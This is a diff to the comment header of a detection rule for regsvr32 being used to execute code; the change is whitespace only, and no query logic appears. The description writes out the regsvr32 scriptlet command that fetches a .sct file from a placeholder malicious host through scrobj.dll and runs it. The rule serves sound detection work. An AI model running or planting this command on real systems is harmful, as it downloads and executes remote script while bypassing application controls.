@@ -1,6 +1,6 @@
 // Title of Detection:   Regsvr32 being used for code execution
 // Authorship & Contact: https://allthingscomputers.medium.com  https://twitter.com/allthingshandle  https://allthingscomputersblog.wordpress.com/ 
- // Description of the Detection:  the following command demonstrates how to use the utility to gain code execution through script code placed inside the Regsvr32.sct file. The command line switches are used to not display any message (/s), to retrieve the .sct file from the local disk (/i) and to use the unregister method (/u) regsvr32.exe /s/u/
+// Description of the Detection:  the following command demonstrates how to use the utility to gain code execution through script code placed inside the Regsvr32.sct file. The command line switches are used to not display any message (/s), to retrieve the .sct file from the local disk (/i) and to use the unregister method (/u) regsvr32.exe /s/u/
 /i:"www.malicioussiteorIP.com/Regsvr32.sct" scrobj.dll. RegSvr with http or IP to retrieve .sct from a remote sever
 // References (if available):  https://support.microsoft.com/en-us/topic/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages-a98d960a-7392-e6fe-d90a-3f4e0cb543e5
 // The Logic of the Detection or Query Begins Below This Line
